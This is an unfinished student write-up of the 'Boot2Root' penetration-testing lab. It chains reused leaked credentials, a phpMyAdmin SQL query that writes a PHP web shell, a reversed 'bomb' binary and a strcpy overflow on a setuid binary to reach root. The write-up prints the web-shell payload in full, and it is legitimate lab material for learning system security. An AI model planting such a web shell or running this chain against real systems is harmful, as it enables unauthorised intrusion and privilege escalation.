# Boot2Root Writeup 1
> Summary: This project is an introduction to system penetration.

> After all your efforts you will finally be able to have fun! This project is therefore a basis for making you understand how you must proceed to penetrate a system over which you have legal rights. I strongly urge you to use all available methods to really break this iso. The correction will be limited but your ability to be able to use your iso will be greatly rewarded for you, especially beyond your score.

### Step 1 : Find the Virtual machine IP address and open ports
Using `nmap` we can scan the local network to find the virtual machine's IP
In our case the ip was
- `10.11.100.242`

After scanning that IP using nmap we see multiple open ports.
```
Nmap scan report for 10.11.100.242
Host is up (0.0073s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
### Step 2 : Find an entrypoint on the website

After using dirbuster to find subdirectories on `https://10.11.100.242`
We find the following links:
- https://10.11.100.242/forum/
- https://10.11.100.242/phpmyadmin/
- https://10.11.100.242/webmail/

PLEASE INSERT IMAGES HERE
#### Getting access to the forum
While browsing the forum, we find a connection log posted as a post
A user mistakenly entered his password in the username field

INSERT FORUM ARTICLE PASSWORD IMAGE HERE

We try using this password for the user `lmezard`, also appearing in the logs.
And we get access to `lmezard`'s forum account with the credentials
- `lmezard`
- `!q\]Ej?*5K5cy*AJ`

#### Getting access to SquirrelMail
Whe then find an email linked to `lmezard`'s account on the forum
We guess `lmezard` is maybe using the same password with both account
Which is the case, so we get access to `lmezard`'s `squirrelMail` using credentials :
- `laurie@borntosec.net`
- `!q\]Ej?*5K5cy*AJ`

#### Getting access to phpMyAdmin
On `squirrelMail` we find a very important email :
```
Subject:  	DB Access
From:  	qudevide@mail.borntosec.net
Date:  	Thu, October 8, 2015 11:25 pm
To:  	laurie@borntosec.net
Priority:  	Normal
Options:  	View Full Header |  View Printable Version  | Download this as a file

Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
From which we get the username and password to `phpMyAdmin`
- `root`
- `Fg-'kKXBj87E:aJ$`

#### Using phpMyadmin to inject commands
We can run custom `SQL` queries from `phpMyAdmin`
And we can read and write into files as the user `www-data`
So I crafted a custom `SQL` query that will create a php file,
exposed on `https://10.11.100.242/forum/templates_c/shell.php`
Here is the `SQL` query:
```SQL
select "<form action=''><input type='text' name='cmd' value='<?php echo $_GET['cmd'];?>'/><input type='submit'/></form></br><?php $output = shell_exec($_REQUEST['cmd']); echo '<textarea rows=100% cols=100%>'.$output.'</textarea>' ?>" into outfile "/var/www/forum/templates_c/shell.php";
```
This added php file will be executed and will allow us to send our custom shell commands to be executed and the result returned.

We want to see what users are present in the machine
We can either `cat /etc/passwd` or `ls /home/`

When we `ls /home/` we can find a directory called `LOOKATME` inside of which there is a file `password`
`cat /home/LOOKATME/password` will give us `lmezard:G!@M6f4Eatau{sF"`
So we can now log into lmezard user
- `lmezard`
- `G!@M6f4Eatau{sF"`

But these credentials won't work on `ssh`, so they must be for something else, so we try logging in as `lmezard` using `ftp`.
#### FTP - FUN
After loging in to the `FTP` we  find a file `fun`
using the command `file`
we can find out that the `fun` file is a `tar` archive
using
```BASH
$> tar -xvf fun
```
We get the multiple PCAP files.
We combine them in order, compile and run.
We get this output
```
MY PASSWORD IS: Iheartpwnage  
Now SHA-256 it and submit
```
We then get access to `laurie`:
- `laurie`
- `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
#### Laurie's bomb
We find a `README` and a `bomb` binary.
We will use `cutter`, `binary ninja`, or plain `gdb`
We reverse the bomb binary and we see that there are multiple levels.
##### Level 1:
This level simply checks if your answer is equal to `Public speaking is very easy.`
##### Level 2:
This level's input should be a sequence of 6 integers, and checks if this condition is true for all of them.
```C
nums[n+1] == (n + 1) * nums[n]
```
Which will give you this sequence
`1 2 6 24 120 720`
##### Level 3:
multiple possible answers, but in the hint there is a `b`
which gets you the result `1 b 214`
##### Level 4:
This level expects one number `n`
and basically does `fibonacci(n+1)`
and compares the result to `55`
So input `9` will work.
##### Level 5:
This level expects 5 characters
for each character does `c & 0xF`
then uses the result as index, for a character array.
and compares the result with the word `giants`
Here is the character array : `isrveawhobpnutfg`
You can find a script `phase_5_bomb.c` in this repo, to test the possibilities.
Here's the possibilities for this level
```
Now let's see other possibilities  
for 15 : O o  
for 00 : P p  
for 05 : E U e u  
for 11 : K k  
for 13 : M m  
for 01 : A Q a q
```
So maybe we have to try all the cases if the flag doesn't work
##### Level 6:
This is the final level, has a function with a bunch of operations, it took some time to understand what this does.
First you can deduce that it requires 6 unique numbers, from 1 to 6.
if you see the decompiling from `binaryninja`.
You will notice a `node1` variable.
and `node = *(node + 8)`
Gives us a hint that this is some sort of linked list.
If you give it more tought you will see that it tries to reorder a linked list.
So the numbers are the index of the elements of the list.
You can see then that the working sequence is `4 2 6 3 1 5`.
The correct input for the bomb then is :
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```
Which means the password is `Publicspeakingisveryeasy.126241207201b2149opekmq426315`.
But this password is not working :(
And we tried all the possible combinations from phase 4.
But still no solutions, it passes the bomb binary, but not working.
Then we find out in the StackOverflow 42 forum that there is an error in the flag, where the `n-1` and `n-2` should be swapped.
So then we get access to `thor` with credentials:
- `thor`
- `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
#### Thor's Home :
if we inspect thor's home we will find a `README` and `turtle`.
in the `turtle` file we find instructions like :
```
Avance 100 spaces  
Recule 200 spaces  
Avance 100 spaces  
Tourne droite de 90 degrees  
Avance 100 spaces  
Tourne droite de 90 degrees  
Avance 100 spaces  
Recule 200 spaces
```
If you do some research (I already was aware of a language called LOGO), and by the name `turtle` , you will recognise this to be from the language logo.
You just have to do some text replace, like :
`Tourne droite de 90 degrees` -> `droite 90`
And when you run the code using an online logo interpreter.
You will see the turtle draws, `S` `L` `A` `S` `H`
Letter by letter.
Trying this as a password will not work.
Here's when the `Can you digest the message? :)` line will be useful.
A digest is hashing, so let's try some hashes, and we're lucky it uses `md5` so the credentials are :
- `zaz`
- `646da671ca01bb5d84dbb5fb2238dc8e`
#### ZAZ's Home
We find a binary `exploit_me` with root setuid
We reverse a binary and see that it does prety much nothing useful.
```C
int32_t result
if (argc s> 1)
    void buffer
    strcpy(&buffer, *(argv + 4))
    puts(&buffer)
    result = 0
else
    result = 1
return result
```
It may be a vulnerability in `strcpy` or `puts`
Seing the `man strcpy` we find a `BUG` section.
```
BUGS  
If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing  
fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.  
Any time a program reads or copies data into a buffer, the program first needs to check that there's enough  
space.
```
Clearly the program does not check if there's enough space for the copied buffer.
There is a possibility of a buffer overflow.
We then procede to give bigger and bigger input till the program segfaults.
This means we can overwrite the return value, and make code jump to any area in the memory we want.
We then create a string of 0xCC (interrupt instruction).
We run the program with the exploit string and see that the program exits with an interrupt.
So we know this area of memory is executable, and the address we jump to is correct.
Just to adjust for differences in address, we add a `NOP` slide.
And we get a shellcode online that opens a shell.
And voila, we get a shell, `whoami` confirms that we are running as `root
